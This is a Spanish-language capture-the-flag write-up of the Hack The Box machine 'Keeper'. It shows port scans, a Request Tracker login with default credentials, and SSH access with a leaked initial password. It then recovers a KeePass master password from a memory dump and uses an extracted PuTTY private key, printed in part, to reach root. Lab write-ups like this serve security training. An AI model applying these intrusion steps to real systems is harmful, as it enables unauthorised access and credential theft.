# Reconocimiento
---

Para iniciar la evaluación de la máquina **Keeper** en Hack The Box, se comenzó con un escaneo de puertos utilizando Nmap para identificar los servicios disponibles en la máquina objetivo.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.227 -oG ports
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-16 00:18 -03
Initiating SYN Stealth Scan at 00:18
Scanning 10.10.11.227 [65535 ports]
Discovered open port 22/tcp on 10.10.11.227
Discovered open port 80/tcp on 10.10.11.227
Completed SYN Stealth Scan at 00:19, 15.04s elapsed (65535 total ports)
Nmap scan report for 10.10.11.227
Host is up, received user-set (0.16s latency).
Scanned at 2023-12-16 00:18:55 -03 for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
           Raw packets sent: 73909 (3.252MB) | Rcvd: 73532 (2.941MB)
```

El escaneo reveló la existencia de los puertos 22 (SSH) y 80 (HTTP) abiertos en la máquina.

```bash
nmap -p 22,80 -n -Pn -sCV 10.10.11.227 -oN openPorts
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-16 00:21 -03
Nmap scan report for 10.10.11.227
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn\'t have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```

El análisis detallado de los servicios en estos puertos indicó que la máquina estaba ejecutando OpenSSH 8.9p1 en el puerto 22 y un servidor web nginx 1.18.0 en el puerto 80.

Además, se modificó el archivo `/etc/hosts` para asociar la dirección IP de la máquina objetivo con el nombre de dominio `tickets.keeper.htb`.

Se procedió a acceder al sitio web en [http://10.10.11.227](http://10.10.11.227/).

```bash
nvim /etc/hosts
<ip-victima>  tickets.keeper.htb
```

[http://tickets.keeper.htb/rt/](http://tickets.keeper.htb/rt/)

# Descubrimiento de la vulnerabilidad
---

Al explorar **Request Tracker**, se descubrieron credenciales predeterminadas para el usuario root:

[Request Tracker Default credentials](https://docs.bestpractical.com/rt/4.4.4/README.html)

```bash
NOTE: The default credentials for RT are:
		User: root
		Pass: password
```

Ingresando al panel de administración en [http://tickets.keeper.htb/rt/Admin/Users/](http://tickets.keeper.htb/rt/Admin/Users/), se encontraron dos usuarios: `lnorgaard` y `root`.

| #   | Name      | Real Name     | Email Address        | Status  |
| --- | --------- | ------------- | -------------------- | ------- |
| 27  | lnorgaard | Lise Nørgaard | lnorgaard@keeper.htb | Enabled |
| 14  | root      | Enoch Root    | root@localhost       | Enabled |

En el panel de edición del usuario `lnorgaard` [http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27](http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27) se encuentra un comentario indicando que la contraseña inicial es `Welcome2023!`.

```
New user. Initial password set to Welcome2023!
```

Se procede a entablar una conexión por SSH con el servidor como el usuario `lnorgaard`.

```bash
sshpass -p 'Welcome2023!' ssh lnorgaard@<ip-victima>
```

## User Flag
---

Se accedió exitosamente al sistema como `lnorgaard` utilizando la contraseña encontrada. La flag del usuario se obtuvo ejecutando el siguiente comando:

> [!IMPORTANT]
> User flag `cat /home/lnorgaard/user.txt`

# Escalada de privilegios
---

Se procedió a realizar una escalada de privilegios para obtener acceso a la cuenta root. Se estableció un servidor con **python3** para poder descargar el archivo `RT30000.zip` a la máquina atacante.

```bash
python3 -m http.server <puerto>
KeePassDumpFull.dmp  RT30000.zip  k.ppk  passcodes.kdbx
```

Se descargó el archivo `RT30000.zip` en la máquina atacante y se descomprimió con los siguientes comandos:

```bash
wget http://<ip-victima>/<puerto>/RT30000.zip
unzip RT30000.zip
```

Utilizando la herramienta [KeePass 2.X Master Password Dumper](https://github.com/vdohney/keepass-password-dumper?tab=readme-ov-file), se extrajo una posible contraseña.

[Setup KeePass 2.X Master Password Dumper](https://github.com/vdohney/keepass-password-dumper?tab=readme-ov-file#setup)

Para configurar el KeePass se necesitó instalar lo siguiente:
[Download .NET For Windows](https://dotnet.microsoft.com/en-us/download)
[Descargar .NET 7.0 Runtime](https://dotnet.microsoft.com/es-es/download/dotnet/7.0/runtime?cid=getdotnetcore&os=windows&arch=x64)

Se ejecutó el programa `dotnet` para extraer la posible contraseña
`dotnet run KeePassDumpFull.dmp`

```bash
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M,
3.:     d,
4.:     g,
5.:     r,
6.:     ø,
7.:     d,
8.:      ,
9.:     m,
10.:    e,
11.:    d,
12.:     ,
13.:    f,
14.:    l,
15.:    ø,
16.:    d,
17.:    e,
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

Tras una búsqueda en Google de la posible contraseña encontrada se determinó que la contraseña está escrita en idioma danés.
[Resultados de la búsqueda en Google de M}dgrød med fløde](https://www.google.com/search?q=M%7Ddgr%C3%B8d+med+fl%C3%B8de&rlz=1C1CHBF_esAR1082AR1082&oq=M%7Ddgr%C3%B8d+med+fl%C3%B8de&gs_lcrp=EgZjaHJvbWUqBggAEEUYOzIGCAAQRRg7Mg4IARAAGAoYQxiABBiKBdIBBzc4MWowajeoAgCwAgA&sourceid=chrome&ie=UTF-8)
`rødgrød med fløde`

Se descargó [KeePassXC](https://keepassxc.org/) y se utilizó para abrir el archivo `passcodes.kdbx` con la contraseña obtenida.
[https://keepassxc.org/download/#linux](https://keepassxc.org/download/#linux)

```bash
keepassxc passcodes.kdbx
rødgrød med fløde
```

En el apartado **Network** se encuentra un usuario **root** y se visualiza una clave privada la que copiamos y guardamos en un archivo con extensión **.ppk**

key.ppk
```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
```

Para acceder al sistema como el usuario root y haciendo uso de la clave encontrada en el gestor de contraseñas se necesita convertir la clave privada.

[https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)  
Seguir las instrucciones del README.md para instalar la última versión de `putty`

```bash
cmake .
cmake --build .
cmake --build . --target install
```

Al instalar la versión 0.79 (al día de escrito este write-up) la última versión, se puede convertir el archivo key.ppk a un archivo **PEM RSA private key**. Puede que versiones anteriores a esta arrojen un error en la conversión.

```bash
puttygen key.ppk -O private-openssh -o root.pem
```

Accedemos al sistema mediante SSH haciendo uso de la clave privada recientemente convertida.

```bash
ssh -i root.pem root@10.10.11.227
```

## Root Flag
---

Con privilegios de root, se localizó la root flag en el directorio `/root`

> [!IMPORTANT]
> Root flag `cat /root/root.txt`
